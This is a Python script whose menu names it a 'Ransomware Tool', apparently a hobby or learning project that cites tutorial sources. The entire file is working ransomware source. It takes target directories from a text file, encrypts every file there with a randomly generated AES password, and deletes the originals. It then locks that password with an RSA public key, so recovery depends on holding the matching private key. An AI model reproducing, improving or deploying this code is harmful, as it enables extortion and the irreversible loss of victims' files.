# Import Functions
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from os import path
import pyAesCrypt
import string
import random
import os

# Define Functions
def clear():
    os.system('clear')

def int_input_getter(prompt, num_range):
    while True:
        # Test for errors.
        try:
            choice = int(input(prompt))
        # If there is a value error pass so the loop can restart.
        except ValueError:
            pass
        # Otherwise, test to see if the number chosen is available.
        else:
            # If the number is available then return that number.
            if choice in num_range:
                return choice
            else:
                print("That is not an option!")
                input("Press enter to continue...")

def gen_key():
    # Generate Symmetric Key & Store in Variable
    clear()
    global sym
    passwd=''
    for i in range (15):
        nums = string.digits
        passwd+=random.choice(nums)
    for i in range (15):
        letters = string.ascii_letters
        passwd+=random.choice(letters)
    l=list(passwd)
    random.shuffle(l)
    sym= ''.join(l)
    #print("Symmetric Key is: " + sym)
    #print()

def enum_files():
    # Read Target Directories from 'dir.txt' & Enumerate Them
    f = open('dirs.txt', 'r')
    target_dirs = f.readlines()
    global files
    files=[]
    for dir in target_dirs:
        dir_files = []
        # Enumerate Target Directory & Populate List
        dir_files += os.listdir(dir.strip())
        for i in dir_files:
          path = dir.strip() + i
          index_of_file = dir_files.index(i)
          dir_files[index_of_file] = path
        files+=dir_files

def encrypt():
    #Check if files have already been encrypted, exit if needed
    ###This is to prevent the existing symmetric key from being lost forever
    key_exists = path.exists('encrypted_sym')
    if key_exists == True:
      print('Existing key found, data is already encrypted...')
      print()
      print('This program does not support double encryption because doing so would overwrite the existing key and make the data that is already encrypted irrecoverable :(')
      exit(0)
    #If no symmetric key exists, create one
    gen_key()
    #Enumerate target directories
    enum_files()
    # Encrypt Files
    #clear()
    global bufferSize
    bufferSize = 64 * 1024
    print('Encrypting Files...')
    for i in files:
        new_name=i+'.aes'
        pyAesCrypt.encryptFile(i, new_name, sym, bufferSize)
        # Delete Originals
        os.remove(i)
    #Encrypt Symmetric Key on Disk with Public Key
    sym_bytes=bytes(sym, 'utf-8')
    with open("public_key.pem", "rb") as key_file:
        public_key = serialization.load_pem_public_key(
            key_file.read(),
            backend=default_backend()
        )
    encrypted = public_key.encrypt(
        sym_bytes,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    with open('encrypted_sym', 'wb') as f:
        f.write(encrypted)
    print("Data is now encrypted :)")
    print()
    exit(0)

def decrypt():
    private_key_exists = path.exists('private_key.pem')
    if private_key_exists == True:
      #Read Encrypted Symmetric Key
      f = open("encrypted_sym", "rb")
      encrypted=f.read()
      #Read Private Key
      with open("private_key.pem", "rb") as key_file:
        private_key = serialization.load_pem_private_key(
          key_file.read(),
          password=None,
          backend=default_backend()
      )    
      #Decrypt Symmetric Key with Private Key
      original_message = private_key.decrypt(
          encrypted,
          padding.OAEP(
              mgf=padding.MGF1(algorithm=hashes.SHA256()),
              algorithm=hashes.SHA256(),
              label=None
          )
      )
      sym=original_message.decode('utf-8')
      #Enumerate target directories
      enum_files()
      # Decrypt .aes Files
      clear()
      global bufferSize
      bufferSize = 64 * 1024
      print('Decrypting Files...')
      for i in files:
          if '.aes' in i: 
            new_name=i.replace('.aes', '')
            pyAesCrypt.decryptFile(i, new_name, sym, bufferSize)
            # Delete Originals
            os.remove(i)
          else:
            print('File ' + i + ' is not encrypted')
      os.remove('encrypted_sym')
      print("Data is now decrypted :)")
      print()
      exit(0)
    else:
      clear()
      print("Looks like you don't have the private key :'(")
      print()
      print("Private key must be in current directory and be named 'private_key.pem'")
      exit(0)

# Main Program
main_menu = """Ransomware Tool
1. Encrypt
2. Decrypt
3. Quit
"""

while True:
    uio = int_input_getter(main_menu, range(1, 5))
    if uio == 1:
        encrypt()
    elif uio == 2:
        decrypt()
    elif uio == 3:
        exit(0)
    else:
        exit(0)

###Sources###

#Asymmetric cryptography: https://nitratine.net/blog/post/asymmetric-encryption-and-decryption-in-python/
#Symmetric encryption and decryption: https://pypi.org/project/pyAesCrypt/
#Random symmetric key generation: https://www.programiz.com/python-programming/examples/random-number
